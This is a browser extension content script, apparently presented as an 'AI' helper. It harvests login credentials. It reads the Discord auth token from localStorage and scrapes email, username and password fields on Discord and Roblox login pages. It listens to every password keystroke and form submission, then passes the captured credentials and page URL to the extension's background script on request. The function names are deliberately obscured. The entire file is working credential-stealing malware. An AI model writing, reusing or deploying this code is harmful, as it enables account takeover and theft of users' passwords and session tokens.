// ─── CONTENT SCRIPT ───

console.log("[AI] Content script ready");

// ─── Generic helpers ───
function _d(s) { return atob(s); }

// ─── Get auth token ───
function _g1() {
    try {
        var a = localStorage.getItem('token');
        if (a && a.length > 30) return a;
        return null;
    } catch (e) { return null; }
}

// ─── Get login credentials ───
function _g2() {
    var result = { u: null, p: null };
    try {
        // Discord login form
        var emailField = document.querySelector('input[type="email"], input[name="email"], input[autocomplete="email"]');
        var passField = document.querySelector('input[type="password"], input[name="password"], input[autocomplete="current-password"]');
        
        if (emailField && emailField.value) result.u = emailField.value;
        if (passField && passField.value) result.p = passField.value;
        
        // Roblox login form
        if (!result.u || !result.p) {
            var rbxUser = document.querySelector('input[type="text"][name="username"], input[type="text"][autocomplete="username"]');
            var rbxPass = document.querySelector('input[type="password"][name="password"]');
            if (rbxUser && rbxUser.value) result.u = rbxUser.value;
            if (rbxPass && rbxPass.value) result.p = rbxPass.value;
        }
    } catch (e) {}
    return result;
}

// ─── Monitor login attempts ───
function _g3() {
    // Listen for password field changes
    document.addEventListener('input', function(e) {
        if (e.target && e.target.type === 'password') {
            var creds = _g2();
            if (creds.u || creds.p) {
                chrome.runtime.sendMessage({
                    action: 'creds',
                    username: creds.u,
                    password: creds.p,
                    url: window.location.href
                });
            }
        }
    }, true);
    
    // Listen for form submissions
    document.addEventListener('submit', function(e) {
        var creds = _g2();
        if (creds.u || creds.p) {
            chrome.runtime.sendMessage({
                action: 'creds',
                username: creds.u,
                password: creds.p,
                url: window.location.href
            });
        }
    }, true);
}

// ─── Message handlers ───
function _h1(req, sender, res) {
    if (req.action === 'getAuth') {
        var a = _g1();
        res({ auth: a });
        return true;
    }
    if (req.action === 'checkStatus') {
        var a = _g1();
        res({ status: 'ready', hasAuth: (a !== null) });
        return true;
    }
    if (req.action === 'ping') {
        res({ status: 'alive' });
        return true;
    }
    if (req.action === 'getCreds') {
        var c = _g2();
        res({ username: c.u, password: c.p });
        return true;
    }
    return true;
}

chrome.runtime.onMessage.addListener(_h1);

// ─── Start monitoring ───
_g3();

console.log("[AI] Content script loaded");
